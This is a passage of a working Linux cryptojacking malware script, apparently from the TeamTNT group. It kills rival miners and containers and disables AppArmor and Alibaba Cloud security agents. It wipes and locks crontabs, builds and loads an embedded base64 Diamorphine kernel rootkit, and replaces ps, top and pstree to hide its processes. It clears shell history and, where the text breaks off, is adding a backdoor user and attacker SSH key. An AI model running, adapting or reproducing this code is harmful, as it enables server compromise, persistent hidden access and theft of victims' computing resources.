rm /opt/atlassian/confluence/bin/1.sh
rm /opt/atlassian/confluence/bin/1.sh.1
rm /opt/atlassian/confluence/bin/1.sh.2
rm /opt/atlassian/confluence/bin/1.sh.3
rm /opt/atlassian/confluence/bin/3.sh
rm /opt/atlassian/confluence/bin/3.sh.1
rm /opt/atlassian/confluence/bin/3.sh.2
rm /opt/atlassian/confluence/bin/3.sh.3
rm -rf /var/tmp/f41
rm -rf /var/tmp/2.sh
rm -rf /var/tmp/config.json
rm -rf /var/tmp/xmrig
rm -rf /var/tmp/1.so
rm -rf /var/tmp/kworkerds3
rm -rf /var/tmp/kworkerdssx
rm -rf /var/tmp/kworkerds
rm -rf /var/tmp/wc.conf
rm -rf /var/tmp/nadezhda.
rm -rf /var/tmp/nadezhda.arm
rm -rf /var/tmp/nadezhda.arm.1
rm -rf /var/tmp/nadezhda.arm.2
rm -rf /var/tmp/nadezhda.x86_64
rm -rf /var/tmp/nadezhda.x86_64.1
rm -rf /var/tmp/nadezhda.x86_64.2
rm -rf /var/tmp/sustse3
rm -rf /var/tmp/sustse
rm -rf /var/tmp/moneroocean/
rm -rf /var/tmp/devtool
rm -rf /var/tmp/devtools
rm -rf /var/tmp/play.sh
rm -rf /var/tmp/systemctI
rm -rf /var/tmp/.java
rm -rf /var/tmp/1.sh
rm -rf /var/tmp/conf.n
rm -r /var/tmp/lib
rm -r /var/tmp/.lib
chattr -iau /tmp/lok
chmod +700 /tmp/lok
rm -rf /tmp/lok
sleep 1
chattr -i /tmp/kdevtmpfsi
echo 1 > /tmp/kdevtmpfsi
chattr +i /tmp/kdevtmpfsi
sleep 1
chattr -i /tmp/redis2
echo 1 > /tmp/redis2
chattr +i /tmp/redis2
chattr -ia /.Xll/xr
>/.Xll/xr
chattr +ia /.Xll/xr
chattr -ia /etc/trace
>/etc/trace
chattr +ia /etc/trace
chattr -ia /etc/newsvc.sh
chattr -ia /etc/svc*
chattr -ia /tmp/newsvc.sh
chattr -ia /tmp/svc*
>/etc/newsvc.sh
>/etc/svcupdate
>/etc/svcguard
>/etc/svcworkmanager
>/etc/svcupdates
>/tmp/newsvc.sh
>/tmp/svcupdate
>/tmp/svcguard
>/tmp/svcworkmanager
>/tmp/svcupdates
chattr +ia /etc/newsvc.sh
chattr +ia /etc/svc*
chattr +ia /tmp/newsvc.sh
chattr +ia /tmp/svc*
sleep 1
chattr -ia /etc/phpupdate
chattr -ia /etc/phpguard
chattr -ia /etc/networkmanager
chattr -ia /etc/newdat.sh
>/etc/phpupdate
>/etc/phpguard
>/etc/networkmanager
>/etc/newdat.sh
chattr +ia /etc/phpupdate
chattr +ia /etc/phpguard
chattr +ia /etc/networkmanager
chattr +ia /etc/newdat.sh
chattr -ia /etc/zzh
chattr -ia /etc/newinit
>/etc/zzh
>/etc/newinit
chattr +ia /etc/zzh
chattr +ia /etc/newinit
sleep 1
chattr -i /usr/lib/systemd/systemd-update-daily
echo 1 > /usr/lib/systemd/systemd-update-daily
chattr +i /usr/lib/systemd/systemd-update-daily
#yum install -y docker.io || apt-get install docker.io;
docker ps | grep "pocosow" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "gakeaws" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "azulu" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "auto" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "xmr" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "mine" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "slowhttp" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "bash.shell" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "entrypoint.sh" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "/var/sbin/bash" | awk '{print $1}' | xargs -I % docker kill %
docker images -a | grep "pocosow" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "gakeaws" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "buster-slim" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "hello-" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "azulu" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "registry" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "xmr" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "auto" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "mine" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "monero" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "slowhttp" | awk '{print $3}' | xargs -I % docker rmi -f %
#echo SELINUX=disabled >/etc/selinux/config
service apparmor stop
systemctl disable apparmor
service aliyun.service stop
systemctl disable aliyun.service
ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
rm -rf /usr/local/aegis
chattr -R -ia /var/spool/cron
chattr -ia /etc/crontab
chattr -R -ia /etc/cron.d
chattr -R -ia /var/spool/cron/crontabs
crontab -r
rm -rf /var/spool/cron/*
rm -rf /etc/cron.d/*
rm -rf /var/spool/cron/crontabs
rm -rf /etc/crontab
}

kill_miner_proc

kill_sus_proc()
{
    ps axf -o "pid"|while read procid
    do
            ls -l /proc/$procid/exe | grep /tmp
            if [ $? -ne 1 ]
            then
                    cat /proc/$procid/cmdline| grep -a -E "ext4"
                    if [ $? -ne 0 ]
                    then
                            kill -9 $procid
                    else
                            echo "don't kill"
                    fi
            fi
    done
    ps axf -o "pid %cpu" | awk '{if($2>=40.0) print $1}' | while read procid
    do
            cat /proc/$procid/cmdline| grep -a -E "ext4"
            if [ $? -ne 0 ]
            then
                    kill -9 $procid
            else
                    echo "don't kill"
            fi
    done
}
kill_sus_proc

#FixTheSystem

function SetupNameServers(){	
grep -q 8.8.8.8 /etc/resolv.conf || chattr -i /etc/resolv.conf 2>/dev/null 1>/dev/null; tntrecht -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.8.8" >> /etc/resolv.conf; chattr +i /etc/resolv.conf 2>/dev/null 1>/dev/null; tntrecht +i /etc/resolv.conf 2>/dev/null 1>/dev/null
grep -q 8.8.4.4 /etc/resolv.conf || chattr -i /etc/resolv.conf 2>/dev/null 1>/dev/null; tntrecht -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.4.4" >> /etc/resolv.conf; chattr +i /etc/resolv.conf 2>/dev/null 1>/dev/null; tntrecht +i /etc/resolv.conf 2>/dev/null 1>/dev/null
}

SetupNameServers


chattr -iR /var/spool/cron/
tntrecht -iR /var/spool/cron/
crontab -r

function clean_cron(){
chattr -R -ia /var/spool/cron
tntrecht -R -ia /var/spool/cron
chattr -ia /etc/crontab
tntrecht -ia /etc/crontab
chattr -R -ia /etc/cron.d
tntrecht -R -ia /etc/cron.d
chattr -R -ia /var/spool/cron/crontabs
tntrecht -R -ia /var/spool/cron/crontabs
crontab -r
rm -rf /var/spool/cron/*
rm -rf /etc/cron.d/*
rm -rf /var/spool/cron/crontabs
rm -rf /etc/crontab
}

clean_cron


function lock_cron()
{
    chattr -R +ia /var/spool/cron
    tntrecht -R +ia /var/spool/cron
    touch /etc/crontab
    chattr +ia /etc/crontab
    tntrecht +ia /etc/crontab
    chattr -R +ia /var/spool/cron/crontabs
    tntrecht -R +ia /var/spool/cron/crontabs
    chattr -R +ia /etc/cron.d
    tntrecht -R +ia /etc/cron.d
}

lock_cron


function installdia(){

DIA_TAR='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'

chattr -ia / /etc/ /tmp/ /var/ /var/tmp/ 2>/dev/null
chattr -R -ia /tmp/ /var/tmp/ 2>/dev/null
chmod 1777 /tmp/ /var/tmp/ 2>/dev/null


if type yum 2>/dev/null 1>/dev/null; then yum clean all ; yum -y install gcc make kmod elfutils-libelf-devel; yum -y install "kernel-devel-uname-r == $(uname -r)" ;  yum list|grep kernel-devel|awk '{print $1}'|xargs yum -y install ; fi
if type apt 2>/dev/null 1>/dev/null; then apt update --fix-missing ; apt-get -y install gcc make kmod libelf-dev libelf-devel; apt-get -y install linux-headers-$(uname -r)  ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add linux-headers 2>/dev/null ; fi

if [ ! -d "/var/tmp/.../dia/" ]; then mkdir -p /var/tmp/.../dia/ ; fi
echo $DIA_TAR | base64 -d > /var/tmp/.../dia/dia.tar.gz
tar xvf /var/tmp/.../dia/dia.tar.gz -C /var/tmp/.../dia/
rm -f /var/tmp/.../dia/dia.tar.gz
kdir=/usr/src/kernels/$(uname -r)/
test -d /lib/modules/$(uname -r)/build
if [ $? -ne 0 ]
  then
  echo "build directory not exist,try to create soft link to /usr/src/kernels/"
  test -d $kdir
  if [ $? -ne 0 ]
     then
     echo "uname -r result is not eqel exist kernel version,try to link other version "
     for kdir in $(ls -lrt /usr/src/kernels/|grep -v total|awk '{print $NF}')
     do 
     cd /lib/modules/$(uname -r)/ && rm -rf build && ln -s /usr/src/kernels/$kdir/ ./build
     cd /var/tmp/.../dia && make
     done
  else 
     cd /lib/modules/$(uname -r)/ && rm -rf build && ln -s /usr/src/kernels/$kdir/ ./build
	 cd /var/tmp/.../dia && make
  fi
else 
  echo "build directory exist ,eqel kernel version"
  cd /var/tmp/.../dia && make
fi
}

function SecureTheSystem(){

CHECK_WHOAMI=`whoami`

function old_school_hide(){
echo "bash hide"
}

function setup_dia(){
if [ -f "/var/tmp/.../dia/diamorphine.ko" ]; then 
cd /var/tmp/.../dia/ && /sbin/insmod diamorphine.ko
    ROOTMO=`ps aux | grep -v grep | grep '/var/tmp/.system/\[ext4\].pid' | awk '{print $2}'`
    if [ ! -z "$ROOTMO" ]; then kill -31 $ROOTMO ; fi
	    if [ -f "/bin/ps.original" ]
    then
        echo "/bin/ps changed"
    else
        mv /bin/ps /bin/ps.original
        echo "#! /bin/bash">>/bin/ps
        echo "ps.original \$@ | grep -v \"ext4\|scan\"">>/bin/ps
        chmod +x /bin/ps
                touch -d 20160825 /bin/ps
        echo "/bin/ps changing"
    fi
    if [ -f "/bin/top.original" ]
    then
        echo "/bin/top changed"
    else
        mv /bin/top /bin/top.original
        echo "#! /bin/bash">>/bin/top
        echo "top.original \$@ | grep -v \"ext4\|scan\"">>/bin/top
        chmod +x /bin/top
                touch -d 20160825 /bin/top
        echo "/bin/top changing"
    fi
    if [ -f "/bin/pstree.original" ]
    then
        echo "/bin/pstree changed"
    else
        mv /bin/pstree /bin/pstree.original
        echo "#! /bin/bash">>/bin/pstree
        echo "pstree.original \$@ | grep -v \"ext4\|scan\"">>/bin/pstree
        chmod +x /bin/pstree
                touch -d 20160825 /bin/pstree
        echo "/bin/pstree changing"
    fi
else echo 'build dia fail!'
old_school_hide
fi

}
if [ "$CHECK_WHOAMI" = "root" ]; then setup_dia ; fi
}




function KILLMININGSERVICES(){

echo "[*] Removing previous miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop ext4.service
fi
killall -9 xmrig
echo "do KILLMININGSERVICES"

$(docker rm $(docker ps | grep -v grep | grep "/bin/bash -c 'apt" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
#$(docker rm $(docker ps | grep -v grep | grep "/bin/bash" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
$(docker rm $(docker ps | grep -v grep | grep "/root/startup.sh" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)

$(docker rm $(docker ps | grep -v grep | grep "widoc26117/xmr" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
$(docker rm $(docker ps | grep -v grep | grep "zbrtgwlxz" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
$(docker rm $(docker ps | grep -v grep | grep "tail -f /dev/null" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
	
	
rm -f /usr/bin/docker-update 2>/dev/null 1>/dev/null
pkill -f /usr/bin/docker-update 2>/dev/null 1>/dev/null
killall -9 docker-update  2>/dev/null 1>/dev/null

rm -f /usr/bin/redis-backup 2>/dev/null 1>/dev/null
pkill -f /usr/bin/redis-backup 2>/dev/null 1>/dev/null
killall -9 redis-backup 2>/dev/null 1>/dev/null

rm -f /tmp/moneroocean/xmrig 2>/dev/null 1>/dev/null
pkill -f /tmp/moneroocean/xmrig 2>/dev/null 1>/dev/null
rm -fr /tmp/moneroocean/ 2>/dev/null 1>/dev/null
killall -9 xmrig 2>/dev/null 1>/dev/null

LOCKFILE='IyEvYmluL2Jhc2gKZWNobyAnRm9yYmlkZGVuIGFjdGlvbiAhISEgVGVhbVROVCBpcyB3YXRjaGluZyB5b3UhJw=='

if [ ! -f /usr/bin/tntrecht ]; then
chattrbin=`which chattr` 
cp $chattrbin /usr/bin/tntrecht 2>/dev/null 1>/dev/null
chmod +x /usr/bin/tntrecht 2>/dev/null 1>/dev/null
chmod -x $chattrbin 2>/dev/null 1>/dev/null
tntrecht +i $chattrbin 2>/dev/null 1>/dev/null
fi

LOCKFILE='IyEvYmluL2Jhc2gKZWNobyAnRm9yYmlkZGVuIGFjdGlvbiAhISEgVGVhbVROVCBpcyB3YXRjaGluZyB5b3UhJw=='

if [ -f /root/.tmp/xmrig ]; then
chattr -iR /root/.tmp/ 2>/dev/null 1>/dev/null
tntrecht -iR /root/.tmp/ 2>/dev/null 1>/dev/null
tmpxmrig=("/root/.tmp/config.json" "/root/.tmp/config_background.json" "/root/.tmp/xmrig.log" "/root/.tmp/miner.sh" "/root/.tmp/xmrig")
for tmpxmrigfile in ${tmpxmrig[@]}; do
rm -f $tmpxmrigfile 2>/dev/null 1>/dev/null
pkill -f $tmpxmrigfile 2>/dev/null 1>/dev/null
kill $(pidof $tmpxmrigfile) 2>/dev/null 1>/dev/null
echo $LOCKFILE | base64 -d > $tmpxmrigfile 
chmod +x $tmpxmrigfile 2>/dev/null 1>/dev/null
chattr +i $tmpxmrigfile 2>/dev/null 1>/dev/null
tntrecht +i $tmpxmrigfile 2>/dev/null 1>/dev/null
pkill -f $tmpxmrigfile 2>/dev/null 1>/dev/null
kill $(pidof $tmpxmrigfile) 2>/dev/null 1>/dev/null
killall $tmpxmrigfile 2>/dev/null 1>/dev/null
chmod -x /root/.tmp/xmrig 2>/dev/null 1>/dev/null
rm -f /root/.tmp/xmrig 2>/dev/null 1>/dev/null
chattr +i /root/.tmp/xmrig 2>/dev/null 1>/dev/null
tntrecht +i /root/.tmp/xmrig 2>/dev/null 1>/dev/null
pkill -f /root/.tmp/xmrig 2>/dev/null 1>/dev/null
ps ax| grep xmrig 2>/dev/null 1>/dev/null
done
fi

if [ -f /usr/sbin/cpumon ]; then
cpumonxmr=("/usr/sbin/cpumon" "/usr/cpu")
for cpumonfile in ${cpumonxmr[@]}; do
chattr -i $cpumonfile 2>/dev/null 1>/dev/null
tntrecht -i $cpumonfile 2>/dev/null 1>/dev/null
rm -f $cpumonfile 2>/dev/null 1>/dev/null
pkill -f $cpumonfile 2>/dev/null 1>/dev/null
kill $(pidof $cpumonfile) 2>/dev/null 1>/dev/null
echo $LOCKFILE | base64 -d > $cpumonfile
chmod +x $cpumonfile 2>/dev/null 1>/dev/null
chattr +i $cpumonfile 2>/dev/null 1>/dev/null
tntrecht +i $cpumonfile 2>/dev/null 1>/dev/null
pkill -f $cpumonfile 2>/dev/null 1>/dev/null
kill $(pidof $cpumonfile) 2>/dev/null 1>/dev/null
killall $cpumonfile 2>/dev/null 1>/dev/null
done
fi

if [ -f /opt/server ]; then
chattr -i /opt/server 2>/dev/null 1>/dev/null
tntrecht -i /opt/server 2>/dev/null 1>/dev/null
rm -f /opt/server 2>/dev/null 1>/dev/null
pkill -f /opt/server 2>/dev/null 1>/dev/null
kill $(pidof /opt/server) 2>/dev/null 1>/dev/null
fi

if [ -f /tmp/log_rotari ]; then
chattr -i /tmp/log_rotari 2>/dev/null 1>/dev/null
tntrecht -i /tmp/log_rotari 2>/dev/null 1>/dev/null
rm -f /tmp/log_rotari 2>/dev/null 1>/dev/null
pkill -f /tmp/log_rotari 2>/dev/null 1>/dev/null
kill $(pidof /tmp/log_rotari) 2>/dev/null 1>/dev/null
fi

BASH00=$(ps ax | grep -v grep |  grep "/root/.tmp00/bash")
if [ ! -z "$BASH00" ];
then
chattr -i /var/spool/cron/root 2>/dev/null 1>/dev/null
tntrecht -i /var/spool/cron/root 2>/dev/null 1>/dev/null
chmod 1777 /var/spool/cron/root 2>/dev/null 1>/dev/null
chmod -x /var/spool/cron/root 2>/dev/null 1>/dev/null
echo " " > /var/spool/cron/root 2>/dev/null 1>/dev/null
rm -f /var/spool/cron/root 2>/dev/null 1>/dev/null
chattr -i /root/.tmp00/bash 2>/dev/null 1>/dev/null
tntrecht -i /root/.tmp00/bash 2>/dev/null 1>/dev/null
chmod -x /root/.tmp00/bash 2>/dev/null 1>/dev/null
pkill -f /root/.tmp00/bash 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/root/.tmp00/bash" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /root/.tmp00/bash) 2>/dev/null 1>/dev/null
echo " " > /root/.tmp00/bash 2>/dev/null 1>/dev/null
rm -f /root/.tmp00/bash 2>/dev/null 1>/dev/null
echo $StringToLock > /root/.tmp00/bash
chattr +i /root/.tmp00/bash 2>/dev/null 1>/dev/null
tntrecht +i /root/.tmp00/bash 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

BASH6400=$(ps ax | grep -v grep |  grep "/root/.tmp00/bash64")
if [ ! -z "$BASH6400" ];
then
chattr -i /var/spool/cron/root 2>/dev/null 1>/dev/null
tntrecht -i /var/spool/cron/root 2>/dev/null 1>/dev/null
chmod 1777 /var/spool/cron/root 2>/dev/null 1>/dev/null
chmod -x /var/spool/cron/root 2>/dev/null 1>/dev/null
echo " " > /var/spool/cron/root 2>/dev/null 1>/dev/null
rm -f /var/spool/cron/root 2>/dev/null 1>/dev/null
chattr -i /root/.tmp00/bash64 2>/dev/null 1>/dev/null
tntrecht -i /root/.tmp00/bash64 2>/dev/null 1>/dev/null
chmod -x /root/.tmp00/bash64 2>/dev/null 1>/dev/null
pkill -f /root/.tmp00/bash64 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/root/.tmp00/bash64" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /root/.tmp00/bash64) 2>/dev/null 1>/dev/null
echo " " > /root/.tmp00/bash64 2>/dev/null 1>/dev/null
rm -f /root/.tmp00/bash64 2>/dev/null 1>/dev/null
echo $StringToLock > /root/.tmp00/bash64
chattr +i /root/.tmp00/bash64 2>/dev/null 1>/dev/null
tntrecht +i /root/.tmp00/bash64 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

KINSING1=$(ps ax | grep -v grep |  grep "/var/tmp/kinsing")
if [ ! -z "$KINSING1" ];
then
chattr -i /var/tmp/kinsing 2>/dev/null 1>/dev/null
tntrecht -i /var/tmp/kinsing 2>/dev/null 1>/dev/null
chmod -x /var/tmp/kinsing 2>/dev/null 1>/dev/null
pkill -f /var/tmp/kinsing 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/var/tmp/kinsing" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /var/tmp/kinsing) 2>/dev/null 1>/dev/null
echo " " > /var/tmp/kinsing 2>/dev/null 1>/dev/null
rm -f /var/tmp/kinsing 2>/dev/null 1>/dev/null
echo $StringToLock > /var/tmp/kinsing
chattr +i /var/tmp/kinsing 2>/dev/null 1>/dev/null
tntrecht +i /var/tmp/kinsing 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

KINSING2=$(ps ax | grep -v grep |  grep "/tmp/kdevtmpfsi")
if [ ! -z "$KINSING2" ];
then
chattr -i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
tntrecht -i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
chmod -x /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
pkill -f /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/tmp/kdevtmpfsi" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /tmp/kdevtmpfsi) 2>/dev/null 1>/dev/null
echo " " > /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
rm -f /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
echo $StringToLock > /tmp/kdevtmpfsi
chattr +i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
tntrecht +i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

kill $(ps aux | grep -vw ext4 | grep -v grep |grep -v scan | grep -vw "/usr/bin/xmrigMiner" | grep -vw "./shell"  | awk '{if($3>40.0) print $2}')

}

function makesshaxx(){
echo "begin makessh"
RSAKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmEFN80ELqVV9enSOn+05vOhtmmtuEoPFhompw+bTIaCDsU5Yn2yD77Yifc/yXh3O9mg76THr7vxomguO040VwQYf9+vtJ6CGtl7NamxT8LYFBgsgtJ9H48R9k6H0rqK5Srdb44PGtptZR7USzjb02EUq/15cZtfWnjP9pKTgscOvU6o1Jpos6kdlbwzNggdNrHxKqps0so3GC7tXv/GFlLVWEqJRqAVDOxK4Gl2iozqxJMO2d7TCNg7d3Rr3w4xIMNZm49DPzTWQcze5XciQyNoNvaopvp+UlceetnWxI1Kdswi0VNMZZOmhmsMAtirB3yR10DwH3NbEKy+ohYqBL root@puppetserver"
grep -q hilde /etc/passwd || chattr -ia /etc/passwd; 
grep -q hilde /etc/passwd || tntrecht -ia /etc/passwd; 
grep -q hilde /etc/passwd || echo 'hilde:x:1000:1000::/home/hilde:/bin/bash' >> /etc/passwd; chattr +ia /etc/passwd; tntrecht +ia /etc/passwd
grep -q hilde /etc/shadow || chattr -ia /etc/shadow; 
